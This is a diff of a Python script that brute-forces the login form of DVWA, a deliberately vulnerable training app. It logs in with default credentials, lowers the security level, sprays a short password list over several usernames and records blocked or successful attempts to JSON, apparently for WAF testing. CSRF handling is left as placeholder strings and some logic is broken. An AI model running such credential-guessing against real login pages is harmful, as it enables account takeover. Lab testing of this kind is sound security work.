@@ -1,73 +1,119 @@
-
 import requests
 import sys
 import time
 import json
 from datetime import datetime
 from pathlib import Path
+import os
 
-# Diretório dos logs .json
+# Setup directories and session
 logs_dir = Path('logs')
+logs_dir.mkdir(exist_ok=True)
+session = requests.Session()
 
+# Checking and setting base URL and request rate from command line arguments
 if len(sys.argv) > 2:
-    url_base = sys.argv[1]  # URL base do DVWA
-    taxa_envio = sys.argv[2]  # Taxa de envio (baixo, medio, alto)
+    base_url = sys.argv[1]  # Receives the base URL as the script argument
+    request_rate = sys.argv[2]  # Receives the request rate as the second argument
 else:
-    print("URL base e/ou taxa de envio não fornecidas.")
+    print("Base URL and/or request rate were not provided.")
     sys.exit(1)
 
-delays = {'baixo': 7, 'medio': 2, 'alto': 0.5}
-delay = delays.get(taxa_envio, 2)  # Padrão é 'medio' se não especificado
+# Map request rate to a specific time interval
+delays = {'low': 7, 'medium': 2, 'high': 0.5}
+delay = delays.get(request_rate, 'medium')  # Default to 'medium' if rate is unrecognized
 
-url_alvo = f"{{url_base}}DVWA/vulnerabilities/brute_force"
+# Construct the target URL for brute force attacks
+target_url = f"{base_url}/vulnerabilities/brute/"
+login_url = f"{base_url}/login.php"
+security_url = f"{base_url}/security.php"
 
-headers = {{
-    "User-Agent": "Mozilla/5.0"
-}}
+def login_and_setup_security():
+    response = session.get(login_url)
+    token = 'EXTRACTED_CSRF_TOKEN'  # Add your extraction logic here
+    data = {
+        'username': 'admin',
+        'password': 'password',
+        'Login': 'Login',
+        'user_token': token
+    }
+    session.post(login_url, data=data)
+    response = session.get(security_url)
+    security_token = 'EXTRACTED_SECURITY_TOKEN'  # Add logic to extract security token
+    data = {
+        'security': 'low',
+        'seclev_submit': 'Submit',
+        'user_token': security_token
+    }
+    session.post(security_url, data=data)
 
-payloads = {{
-    "payload1": "detalhes do payload",
-    "payload2": "detalhes do payload"
-}}
+def brute_force_attack():
+    results = []
+    total_tests = 0
+    tests_passed = 0
+    tests_failed = 0
 
-total_testes = 0
-testes_passaram = 0
-testes_falharam = 0
+    passwords = ['password', '123456', 'admin123', 'letmein', '12345678']
+    for username in ['admin', 'user1', 'user2', 'user3', 'user4']:
+        for pw in passwords:
+            data = {
+                'username': username,
+                'password': pw,
+                'Login': 'Login'
+            }
+            response = session.post(target_url, data=data)
+            success = response.status_code == 200 and "Welcome to the password protected area" in response.text
+            failure = "Username and/or password incorrect." in response.text
+            response_code = response.status_code
 
-for nome_payload, payload in payloads.items():
-    total_testes += 1
+            total_tests += 1
+            if success:
+                tests_passed += 1
+                result_status = "PASSED"
+            elif failure:
+                tests_failed += 1
+                result_status = "FAILED"
+            else:
+                if response_code == 200:
+                    tests_failed += 1
+                    result_status = "FAILED - Username does not exist"
+                elif response_code in [429, 403]:
+                    tests_failed += 1
+                    result_status = "FAILED - WAF blocked the brute force attack"
+                else:
+                    tests_failed += 1
+                    result_status = "FAILED - Unknown reason"
 
-    # Modificar a lógica de envio conforme necessário
-    resposta_teste = requests.get(url_alvo, headers=headers, params={{'parametro': payload}})
+            results.append({
+                'username': username,
+                'password': pw,
+                'success': success,
+                'failure': failure,
+                'response_code': response.status_code,
+                'result_status': result_status
+            })
+            print(f"Test {total_tests}: {result_status} - Username: '{username}', Password: '{pw}'")
+            time.sleep(delay)  # Delay between requests based on rate
 
-    if resposta_teste.status_code == 200:  # Modificar a lógica de verificação conforme necessário
-        print(f"Teste #{{total_testes}} PASSOU: Vulnerabilidade 'Brute Force' detectada com payload '{{nome_payload}}'!")
-        testes_passaram += 1
-    else:
-        print(f"Teste #{{total_testes}} FALHOU.")
-        testes_falharam += 1
+    # Get the name of the current script
+    script_name = os.path.splitext(os.path.basename(__file__))[0]
+    # Save results
+    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+    file_name = f"results_{script_name}_{timestamp}.json"  # Include script name in the file name
+    results_file = logs_dir / file_name
+    result_summary = {
+        'date_time': timestamp,
+        'base_url': base_url,
+        'total_tests': total_tests,
+        'tests_passed': tests_passed,
+        'tests_failed': tests_failed,
+        'tested_url': target_url,
+        'details': results
+    }
+    with open(results_file, 'w') as f:
+        json.dump(result_summary, f, indent=4)
+    print(f"Results saved to {results_file}")
 
-    time.sleep(delay)  # Delay entre os testes
-
-print(f"\nTotal de Testes: {{total_testes}}")
-print(f"Testes Passaram: {{testes_passaram}}")
-print(f"Testes Falharam: {{testes_falharam}}")
-print(f"Url Testada: {{url_alvo}}")
-
-# Gravar resultados
-resultados = {{
-    'data_hora': datetime.now().strftime("%Y-%m-%d_%H-%M-%S"),
-    'url_base': url_base,
-    'total_testes': total_testes,
-    'testes_passaram': testes_passaram,
-    'testes_falharam': testes_falharam,
-    'url_testada': url_alvo
-}}
-
-nome_arquivo = f"resultados_{{resultados['data_hora']}}.json"
-caminho_completo_arquivo = logs_dir / nome_arquivo
-
-with open(caminho_completo_arquivo, 'w') as arquivo:
-    json.dump(resultados, arquivo, indent=4)
-
-print(f"Resultados gravados em {{caminho_completo_arquivo}}")
+if __name__ == "__main__":
+    login_and_setup_security()
+    brute_force_attack()
